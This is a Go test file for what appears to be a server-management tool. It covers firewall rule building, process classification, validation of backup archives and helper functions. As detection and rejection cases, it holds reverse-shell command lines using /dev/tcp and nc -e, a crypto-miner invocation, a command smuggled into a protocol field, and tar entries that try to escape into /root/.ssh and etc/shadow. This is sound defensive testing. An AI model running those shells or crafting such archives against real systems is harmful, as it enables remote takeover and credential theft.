package cmd

import (
	"archive/tar"
	"compress/gzip"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestPidMatchesRequiresExactArgv(t *testing.T) {
	if _, err := os.Stat("/proc/self/cmdline"); err != nil {
		t.Skip("no /proc")
	}
	self := &ServiceDef{Exec: os.Args[0], Args: strings.Join(os.Args[1:], " ")}
	if !pidMatches(self, os.Getpid()) {
		t.Fatalf("expected own process to match its argv")
	}
	other := &ServiceDef{Exec: os.Args[0], Args: "firewall apply"}
	if pidMatches(other, os.Getpid()) {
		t.Fatalf("same binary with different args must not match")
	}
}

func TestValidName(t *testing.T) {
	for _, bad := range []string{"", "..", "../x", "a/b", "-rf", "A"} {
		if validName(bad) == nil {
			t.Errorf("validName(%q) should fail", bad)
		}
	}
	if err := validName("ziro-api"); err != nil {
		t.Errorf("validName(ziro-api): %v", err)
	}
}

func TestBuildNftScript(t *testing.T) {
	cfg := FirewallConfig{
		AllowedPorts: []FirewallRule{{Port: 22, Protocol: "tcp"}},
		BlockedIPs:   []BlockedIP{{IP: "203.0.113.0/24"}, {IP: "2001:db8::/32"}},
	}
	script, err := buildNftScript(cfg)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(script, "flush ruleset") {
		t.Errorf("must never flush the global ruleset (breaks CNI/NAT)")
	}
	for _, want := range []string{"policy drop", "tcp dport 22 accept", "ip saddr 203.0.113.0/24 drop", "ip6 saddr 2001:db8::/32 drop"} {
		if !strings.Contains(script, want) {
			t.Errorf("script missing %q", want)
		}
	}

	if _, err := buildNftScript(FirewallConfig{AllowedPorts: []FirewallRule{{Port: 22, Protocol: "tcp; flush ruleset"}}}); err == nil {
		t.Errorf("injected protocol must be rejected")
	}
	if _, err := buildNftScript(FirewallConfig{BlockedIPs: []BlockedIP{{IP: "1.2.3.4 accept"}}}); err == nil {
		t.Errorf("invalid IP must be rejected")
	}
	if p, _ := parsePortProto("80/icmp"); p != 0 {
		t.Errorf("unknown protocol must be rejected")
	}
}

func TestClassifyProcess(t *testing.T) {
	cases := []struct {
		argv   []string
		socket bool
		want   string
	}{
		{[]string{"ssh", "-i", "key.pem", "host"}, false, ""},
		{[]string{"/bin/bash", "-i"}, false, ""},
		{[]string{"/bin/bash", "-i"}, true, "REVERSE_SHELL"},
		{[]string{"bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}, false, "REVERSE_SHELL"},
		{[]string{"nc", "10.0.0.1", "4444", "-e", "/bin/sh"}, false, "REVERSE_SHELL"},
		{[]string{"nc", "-l", "8080"}, false, ""},
		{[]string{"/tmp/xmrig", "-o", "pool"}, false, "CRYPTO_MINER"},
	}
	for _, c := range cases {
		if got, _, _ := classifyProcess(c.argv, c.socket); got != c.want {
			t.Errorf("classifyProcess(%v, %v) = %q, want %q", c.argv, c.socket, got, c.want)
		}
	}
}

func TestRateLimiterEvictsIdleClients(t *testing.T) {
	rl := newRateLimiter(10, time.Minute)
	old := time.Now().Add(-2 * time.Minute)
	for i := 0; i < 2000; i++ {
		rl.clients[string(rune(i+1000))] = []time.Time{old}
	}
	rl.allow("fresh")
	if len(rl.clients) > 10 {
		t.Fatalf("expected idle clients evicted, map has %d", len(rl.clients))
	}
}

func writeTarGz(t *testing.T, hdrs []*tar.Header) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "b.tar.gz")
	f, err := os.Create(p)
	if err != nil {
		t.Fatal(err)
	}
	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)
	for _, h := range hdrs {
		if h.Typeflag == tar.TypeReg {
			h.Size = 1
		}
		if err := tw.WriteHeader(h); err != nil {
			t.Fatal(err)
		}
		if h.Typeflag == tar.TypeReg {
			tw.Write([]byte("x"))
		}
	}
	tw.Close()
	gz.Close()
	f.Close()
	return p
}

func TestValidateBackupArchive(t *testing.T) {
	ok := writeTarGz(t, []*tar.Header{
		{Name: "etc/ziro/", Typeflag: tar.TypeDir, Mode: 0700},
		{Name: "/etc/ziro/firewall.json", Typeflag: tar.TypeReg, Mode: 0600}, // legacy -P archive
	})
	if err := validateBackupArchive(ok); err != nil {
		t.Errorf("valid archive rejected: %v", err)
	}

	bad := map[string][]*tar.Header{
		"outside allowlist": {{Name: "etc/shadow", Typeflag: tar.TypeReg}},
		"traversal":         {{Name: "etc/ziro/../../root/.ssh/authorized_keys", Typeflag: tar.TypeReg}},
		"through symlink": {
			{Name: "etc/ziro/l", Typeflag: tar.TypeSymlink, Linkname: "/root/.ssh"},
			{Name: "etc/ziro/l/authorized_keys", Typeflag: tar.TypeReg},
		},
		"hardlink": {{Name: "etc/ziro/h", Typeflag: tar.TypeLink, Linkname: "etc/shadow"}},
	}
	for name, hdrs := range bad {
		if err := validateBackupArchive(writeTarGz(t, hdrs)); err == nil {
			t.Errorf("%s: expected rejection", name)
		}
	}
}

func TestWireGuardHelpers(t *testing.T) {
	conf := "[Interface]\nAddress = 10.10.0.1/24\nPostUp = iptables -A FORWARD\n\n[Peer]\nAllowedIPs = 10.10.0.2/32\n"
	ip, err := nextPeerIP(conf)
	if err != nil || ip != "10.10.0.3/32" {
		t.Errorf("nextPeerIP = %q, %v; want 10.10.0.3/32", ip, err)
	}
	if s := stripWgQuick(conf); strings.Contains(s, "PostUp") || strings.Contains(s, "Address") || !strings.Contains(s, "AllowedIPs") {
		t.Errorf("stripWgQuick wrong: %q", s)
	}
	priv, pub := generateWgKeypair()
	if priv == pub || len(pub) != 44 {
		t.Errorf("bad keypair %q %q", priv, pub)
	}
}

func TestParseCronLine(t *testing.T) {
	cases := map[string]bool{
		"*/5 * * * * /bin/echo hi": true,
		"@reboot /usr/bin/foo":     true,
		"PATH=/bin:/usr/bin":       false,
		"# comment":                false,
		"":                         false,
	}
	for line, want := range cases {
		if _, _, ok := parseCronLine(line); ok != want {
			t.Errorf("parseCronLine(%q) ok=%v, want %v", line, ok, want)
		}
	}
}

func TestRotateLog(t *testing.T) {
	p := filepath.Join(t.TempDir(), "svc.log")
	if err := os.WriteFile(p, make([]byte, maxLogSize+1), 0600); err != nil {
		t.Fatal(err)
	}
	rotateLog(p)
	if fi, _ := os.Stat(p); fi.Size() != 0 {
		t.Errorf("log not truncated: %d bytes", fi.Size())
	}
	if fi, err := os.Stat(p + ".1"); err != nil || fi.Size() != maxLogSize+1 {
		t.Errorf("previous generation missing or wrong size")
	}
}
